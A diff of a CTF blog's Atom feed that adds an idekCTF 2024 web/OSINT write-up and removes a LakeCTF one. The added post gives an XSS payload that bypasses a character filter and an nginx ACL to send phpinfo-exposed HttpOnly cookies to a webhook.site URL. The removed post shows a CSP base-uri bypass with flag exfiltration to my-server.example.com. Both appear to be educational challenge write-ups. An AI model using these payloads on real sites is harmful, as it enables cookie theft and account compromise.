@@ -1,4 +1,86 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-09-04T11:40:34+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">corCTF 2023 web/crabspace Writeup</title><link href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/" rel="alternate" type="text/html" title="corCTF 2023 web/crabspace Writeup" /><published>2023-08-01T00:00:00+01:00</published><updated>2023-08-01T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/"><![CDATA[<p><a href="https://2023.cor.team/challs">corCTF</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2024-08-19T21:50:18+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">idekCTF Web and OSINT Writeup</title><link href="https://www.cjxol.com/posts/idekctf-2024-writeup/" rel="alternate" type="text/html" title="idekCTF Web and OSINT Writeup" /><published>2024-08-19T00:00:00+01:00</published><updated>2024-08-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/idekctf-2024-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/idekctf-2024-writeup/"><![CDATA[<p>Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).</p>
+
+<h2 id="webhello">web/Hello</h2>
+
+<h3 id="solution-tldr">Solution TLDR</h3>
+
+<ul>
+  <li>Bypass XSS characters filter</li>
+  <li>Bypass nginx ACL rules for PHP</li>
+</ul>
+
+<h3 id="challenge-and-solution">Challenge and Solution</h3>
+
+<p>Relatively easy challenge, with 161 solves. I built the payload iteratively to bypass the restrictions.</p>
+
+<p>Challenge goal is to get the flag set by the admin bot in the “HttpOnly” cookie. The <code class="highlighter-rouge">index.php</code> page is XSS-able, and and <code class="highlighter-rouge">info.php</code> page dumps <code class="highlighter-rouge">phpinfo()</code>, which shows the cookies in the request, including HttpOnly cookies.</p>
+
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">location</span> <span class="p">=</span> <span class="n">/info.php</span> <span class="p">{</span>
+    <span class="kn">allow</span> <span class="mi">127</span><span class="s">.0.0.1</span><span class="p">;</span>
+    <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
+    <span class="kn">root</span>           <span class="n">/usr/share/nginx/html</span><span class="p">;</span>
+    <span class="kn">fastcgi_param</span>  <span class="s">SCRIPT_FILENAME</span>  <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
+    <span class="kn">include</span> <span class="s">fastcgi_params</span><span class="p">;</span>  
+    <span class="kn">fastcgi_pass</span> <span class="s">unix:/var/run/php/php8.2-fpm.sock</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However, as shown above, <code class="highlighter-rouge">nginx.conf</code> blocks access to <code class="highlighter-rouge">info.php</code>, and admin bot cannot acess it either. Referencing to <a href="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass">HackTricks</a>, it can be bypassed with <code class="highlighter-rouge">http://idek-hello.chal.idek.team:1337/info.php/a.php</code>, where nginx does not match to <code class="highlighter-rouge">location = /info.php</code>, instead it matches to <code class="highlighter-rouge">location ~ \.php$</code> and PHP FPM processes with <code class="highlighter-rouge">info.php</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Enhanced_Trim</span><span class="p">(</span><span class="nv">$inp</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$trimmed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="s2">" "</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$trimmed</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$inp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$name</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">23</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"Hello, "</span><span class="mf">.</span><span class="nf">Enhanced_Trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">index.php</code> is XSS injectable, however it does not allow some characters. It was not able to have <code class="highlighter-rouge">&lt;/script&gt;</code> closing tag, and I did not get <code class="highlighter-rouge">script</code> tag without closing tag or using <code class="highlighter-rouge">\</code> instead of <code class="highlighter-rouge">/</code> in the closing tag work. I used <code class="highlighter-rouge">&lt;img&gt;</code> tag with <code class="highlighter-rouge">onerror</code> to make the script to run (<code class="highlighter-rouge">src</code> attribute was necessary too).</p>
+
+<p>The tag looks like this:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">a</span> <span class="na">onerror=</span><span class="s">"fetch('\\info.php\\a.php').then(r=&gt;r.text()).then(r=&gt;fetch('https:\\\\webhook.site\\[REDACTED]',{method:'POST',body:r}))"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">/</code> in the URLs above are replaced with <code class="highlighter-rouge">\</code> to bypass the filter (<code class="highlighter-rouge">\\</code> because of escape. It was only escaped once in JavaScript, HTML does not use <code class="highlighter-rouge">/</code> escape), and it still works.</p>
+
+<p>Replacing space <code class="highlighter-rouge">%20</code> with <code class="highlighter-rouge">%0C</code> to bypass filter, and the encoded payload for admin bot is below:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
+</code></pre></div></div>
+
+<h2 id="miscnmpz-geoguessr-style">misc/NM<del>PZ</del>~ (GeoGuessr-style)</h2>
+
+<p>This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.</p>
+
+<p><em>Image sizes are reduced in the blogpost.</em></p>
+
+<h3 id="beach_property-medium-brazil">beach_property (medium, Brazil)</h3>
+
+<p>Find the very unique-looking building, screenshot and search the image with Google Lens, find it to be the Veleiros Mar hotel in São Luís, Brazil. Then my teammate marked the location on the map to complete this task.</p>
+
+<p><img src="/assets/image/idekctf2024/veleiros-mar.png" alt="Screenshot of Veleiros Mar hotel in the challenge" /></p>
+
+<h3 id="idek_islands-medium-us-virgin-islands">idek_islands (medium, U.S. Virgin Islands)</h3>
+
+<p>Teammates identified through meta (Google car etc.) the location is in U.S. Virgin Islands, and likely to be in the island in the north. The location is by the coast, with coastline kinda concaves, and with buildings nearby. The shadows points inwards the land.</p>
+
+<p>I started searching through the south coast of the two main islands in the north of U.S. Virgin Islands, by looking at the street view coverage finding the roads close to coast, and sometimes enter into street view to check. Eventually found a road with street view coverage near the coast, and the buildings in the satellite view looks matching the ones in the image. It did not take too long. Entered street view and confirmed the location matches.</p>
+
+<h3 id="rise_above-hard-indonesia">rise_above (hard, Indonesia)</h3>
+
+<p>It took a long time to solve this one.</p>
+
+<p>Teammates identified the location in in Indonesia. There is top of a church in the image, signs on the other building saying “RUMAH KEPALA JAGA 1”, and teammate also identified the “Indonesian Democratic Party of Struggle” flag in the image.</p>
+
+<p>I position Google maps at Indonesia and looked up “rumah kepala jaga”, it showed the name with other numbers but not “1”. I looked through some of the locations however non of them was the location. They were mostly located east-most of Sulawesi Utara on one of the main island. There were also a village with many of the same flags in the image, however that village had a church looked different. Then I zoomed out the map a bit and looked up “church” in the area, and the 2nd church I clicked on and entered street view to see was the church I was looking for (extremely lucky I guess).</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><category term="ctf misc" /><category term="ctf osint" /><category term="ctf geoguessr" /><summary type="html"><![CDATA[Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).]]></summary></entry><entry><title type="html">corCTF 2023 web/crabspace Writeup</title><link href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/" rel="alternate" type="text/html" title="corCTF 2023 web/crabspace Writeup" /><published>2023-08-01T00:00:00+01:00</published><updated>2023-08-01T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/"><![CDATA[<p><a href="https://2023.cor.team/challs">corCTF</a><br />
 <a href="https://ctftime.org/event/1928">Event on CTFtime</a></p>
 
 <p>It was a team effort for us to solve this challenge. I learned something new about WebRTC.</p>
@@ -1456,50 +1538,4 @@ Also initialising the model with the given random seed is very important!
 
 <ul>
   <li><a href="https://ike.mahaloz.re/">`Ike: The Systems Hacking Handbook</a></li>
-</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-web-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-web-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-web-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
-
-<p>This is my writeup to web challenge “<a href="https://ctf.polygl0ts.ch/challenges#People-18">People</a>” in <a href="https://ctf.polygl0ts.ch/">LakeCTF</a> Qualifications round. LakeCTF is orgnised by EPFL’s CTF team <a href="https://polygl0ts.ch/">polygl0ts</a>. This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting <code class="highlighter-rouge">base-uri</code>.</p>
-
-<p>The challenge has a downloadable. Examining the code and the application, users can signup a profile with bio and other information, as well as logging in. Upon logging in, user is redirected to their profile page where user information is shown. Users can also report their profile, resulting in the profile page being visited by an admin bot.</p>
-
-<p>This type of web challenges with a bot visiting the page normally involves in exploiting cross-site scripting (XSS).</p>
-
-<p>It appears that it is likely the XSS is on the profile page that the bot visits, and the page displays user information stored in the database. We set the information of the user when signing up the user, however, the signup endpoint is rate limited, so we cannot test many payload through that endpoint on the live website. There is another <code class="highlighter-rouge">/edit</code> endpoint which also enables us to update user information, and there is no rate limit on that endpoint, so we could conveniently test different input on the live website without setting up our own docker container.</p>
-
-<p>Our team managed to quickly find the potential injection point on the profile page. Despite the input are escaped when rendering the page, we noticed that the title also shows data from the database, and the code does not escape it:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set description = '%s at %s' % (user['title'], user['lab']) %}
-{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
-</code></pre></div></div>
-
-<p>As shown above, the <code class="highlighter-rouge">safe</code> filter in the template disables escaping. Thus, we managed to put HTML and JavaScript code into the webpage.</p>
-
-<h2 id="bypass-csp">Bypass CSP</h2>
-
-<p>Despite we have managed to inject new tags and code, we could still not make the browser to execute our XSS code. This is because the app sets <code class="highlighter-rouge">Content-Security-Policy</code> HTTP header that only script tags with the defined nonce would run.</p>
-
-<p>However, the CSP did not define <code class="highlighter-rouge">base-uri</code>, and two of the <code class="highlighter-rouge">&lt;script&gt;</code> tags on the profile page did not use full URL:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/marked.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
-<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/purify.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
-</code></pre></div></div>
-
-<p>Conveniently, the XSS injection point is in <code class="highlighter-rouge">&lt;title&gt;</code>, which is in <code class="highlighter-rouge">&lt;head&gt;</code>, thus we are able to define new base:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;base</span> <span class="na">href=</span><span class="s">"https://my-server.example.com"</span><span class="nt">&gt;</span>
-</code></pre></div></div>
-
-<p>This will result in one of the script on the profile page to load from <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code> and execute.</p>
-
-<p>The final info we set to user’s title in their profile is <code class="highlighter-rouge">&lt;/title&gt;&lt;base href="https://my-server.example.com"&gt;&lt;/head&gt;</code>, and we serve the JavaScript payload at <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code>.</p>
-
-<h2 id="getting-the-flag">Getting the Flag</h2>
-
-<p>Now we are able to make the profile page to pop an alert of whatever we put in the JavaScript file. However our goal is to steal the flag. The flag is accessible through the <code class="highlighter-rouge">/flag</code> endpoint in the webapp. The endpoint checks for <code class="highlighter-rouge">admin_token</code> in cookies. We might want to steal the cookies first, however, when the admin bot visits the webpage, their cookie is set to <code class="highlighter-rouge">httpOnly</code>, so we cannot use XSS to get the cookie. As getting the flag is our only goal, we can workaround by using <code class="highlighter-rouge">fetch</code> API or XMLHttpRequest. As when doing such request on the same site, cookies are sent, and flag will be retrieved.</p>
-
-<p>Our final JavaScript for getting the flag and exfil is:</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
-    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
-    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
-</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry></feed>
